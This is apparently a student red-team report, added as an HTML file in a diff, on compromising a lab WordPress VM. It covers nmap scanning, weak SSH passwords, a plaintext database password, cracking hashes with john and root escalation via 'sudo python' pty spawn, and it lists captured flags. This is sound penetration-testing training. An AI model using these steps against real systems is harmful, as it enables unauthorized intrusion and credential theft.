@@ -1,0 +1,195 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title></title></head><body><h1>Red Team: Summary of Operations</h1>
+
+<h2>Table of Contents</h2>
+
+<ul>
+<li>Exposed Services</li>
+<li>Critical Vulnerabilities</li>
+<li>Exploitation</li>
+</ul>
+
+<h3>Exposed Services</h3>
+
+<p>Nmap scan results for each machine reveal the below services and OS details:</p>
+
+<pre><code class="bash">$ nmap scan: nmap -sV 192.168.1.110
+
+</code></pre>
+
+<p><img src="nmap-target1.JPG" alt=""></p>
+
+<p>This scan identifies the services below as potential points of entry:</p>
+
+<ul>
+<li><p>Target 1</p>
+
+<ul>
+<li>:22 - SSH</li>
+<li>:80 - HTTP</li>
+<li>:111 - rpcbind</li>
+<li>:139 - netbios / smb</li>
+<li>:445 - netbios / smb</li>
+</ul></li>
+</ul>
+
+<p>The following vulnerabilities were identified on each target:</p>
+
+<ul>
+<li><p><strong>Target 1</strong></p>
+
+<ul>
+<li><p><strong>wpscan user enumeration</strong></p>
+
+<ul>
+<li>wpscan was able to enumerate users to uncover usernames for the target system.</li>
+</ul></li>
+<li><p><strong>SSH with Password</strong></p>
+
+<ul>
+<li>No SSH key being used.</li>
+<li>User michael had a password that can be easily guessed.</li>
+</ul></li>
+<li><p><strong>Python can run with sudo</strong></p>
+
+<ul>
+<li>User steven has the ability to run python with sudo</li>
+<li>Python can execute arbitrary code on the system, ultimately creating a loophole for escalated privelages to root access.</li>
+</ul></li>
+<li><p><strong>Database credentials in plain text</strong></p>
+
+<ul>
+<li>Database credentials for the wordpress site were found in /var/www/html/wp_config.php. Once I gained root access to the database, I was able to use mysql to search for files containing the string &ldquo;flag&rdquo; within it&#39;s contents.</li>
+</ul></li>
+<li><p><strong>CVE-2017-3167</strong></p>
+
+<ul>
+<li>Authentication bypass is possible on the version of Apache running on the server.</li>
+</ul></li>
+<li><p><strong>CVE-2017-7494</strong></p>
+
+<ul>
+<li>Version of samba running on the server is insecure and allows for remote code execution.</li>
+</ul></li>
+</ul></li>
+</ul>
+
+<p>-<strong><em>Initial scans to find vulnerabilities:</em></strong></p>
+
+<p><img src="nmap-target1.JPG" alt="">
+<img src="wpscantrgt1.JPG" alt=""></p>
+
+<h3>Exploitation</h3>
+
+<p>The Red Team was able to penetrate <code>Target 1</code> and retrieve the following confidential data:
+- Target 1</p>
+
+<ul>
+<li><p><code>flag1.txt</code>: b9bbcb33e11b80be759c4e844862482d</p>
+
+<ul>
+<li><strong>Exploit Used</strong>
+
+<ul>
+<li>Exploit: Weak password for user michael/ open SSH port, no SSH key set.</li>
+<li>Commands run: 
+
+<ul>
+<li>ssh michael@192.168.1.110</li>
+<li>cd /var/www</li>
+<li>grep -ER flag1
+<img src="flag1-grep.JPG" alt=""></li>
+</ul></li>
+</ul></li>
+</ul></li>
+<li><p><code>flag2.txt</code>: fc3fd58dcdad9ab23faca6e9a36e581c</p>
+
+<ul>
+<li><p><strong>Exploit Used</strong></p>
+
+<ul>
+<li>Exploit: Weak password for user michael/ open SSH port, no SSH key set.</li>
+<li><p>Commands run: </p>
+
+<ul>
+<li>ssh michael@192.168.1.110</li>
+<li>cd /var/www</li>
+<li>cat flag2.txt</li>
+</ul>
+
+<p><img src="flag2.JPG" alt=""></p></li>
+</ul></li>
+</ul></li>
+<li><p><code>flag3.txt</code>: afc01ab56b50591e7dccf93122770cd2</p></li>
+<li><p><code>flag4.txt</code>: 715dea6c055b9fe3337544932f2941ce</p>
+
+<ul>
+<li><p><strong>Exploit Used</strong></p>
+
+<ul>
+<li>Exploit: Root credentials (not hashed) for the mysql database were saved in /var/www/html/wp_config.php</li>
+<li><p>Commands run: </p>
+
+<ul>
+<li>ssh michael@192.168.1.110</li>
+<li>nano /var/www/html/wp_config.php</li>
+<li>mysql -u root -p wordpress (password: R@v3nSecurity)</li>
+<li>mysql &gt; show databases;
+
+<ul>
+<li>use wordpress</li>
+<li>show tables;</li>
+<li>select * from wp_posts;</li>
+</ul></li>
+</ul>
+
+<p><img src="wp-config.php.JPG" alt="">
+<img src="mysql1.JPG" alt="">
+<img src="mysql-flags.JPG" alt=""></p></li>
+</ul></li>
+</ul></li>
+<li><p><code>flag4.txt</code>(As Root): 715dea6c055b9fe3337544932f2941ce</p>
+
+<ul>
+<li><p><strong>Exploit Used</strong></p>
+
+<ul>
+<li><p>Exploit:
+-Privilege escalation using python</p>
+
+<ul>
+<li>After gaining access to steven&#39;s password hash via mysql, I used the john command on hash.txt, where I saved steven&#39;s password hash. </li>
+<li>Checked permissions levels for steven and found that python can be used for privilege escalation.</li>
+</ul></li>
+</ul></li>
+<li><p>Commands run: </p>
+
+<p>-mysql&gt; select * from wp_users;</p>
+
+<p><img src="steven-hash.JPG" alt=""></p>
+
+<p>-root@kali$&gt; echo &ldquo;(stevens password hash)&rdquo; &gt; hashes.txt</p>
+
+<p>-john hashes.txt</p>
+
+<p><img src="john%20hashes.JPG" alt=""></p>
+
+<p>-ssh steven@192.168.1.110</p>
+
+<p>-sudo -l</p>
+
+<p><img src="steven-python.JPG" alt=""></p>
+
+<ul>
+<li>sudo python -c &#39;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;);&#39;</li>
+</ul>
+
+<p>-cd /root</p>
+
+<p>-ls</p>
+
+<p>-cat flag4.txt</p>
+
+<p><img src="steven-flag4.JPG" alt=""></p></li>
+</ul></li>
+</ul>
+</body></html>
